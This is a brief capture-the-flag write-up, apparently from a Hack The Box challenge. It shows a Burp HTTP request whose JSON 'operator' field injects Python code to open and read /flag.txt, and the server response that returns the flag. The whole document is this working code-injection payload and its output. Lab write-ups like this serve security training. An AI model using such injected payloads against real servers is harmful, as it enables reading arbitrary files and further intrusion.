
Request:

```burp
POST /api/get_health HTTP/1.1
Host: 161.35.162.224:31338
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://161.35.162.224:31338/
Content-Type: application/json
Content-Length: 110
Origin: http://161.35.162.224:31338
Connection: close

{"current_health":"100","attack_power":"1","operator":"- 2; f = open('/flag.txt', 'r'); result = f.read(); #"
```

Response:
```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.15
Date: Tue, 25 Oct 2022 15:00:26 GMT
Content-Type: application/json
Content-Length: 47
Connection: close

{"message":"HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}"}

```

![[Pasted image 20221025220249.png]]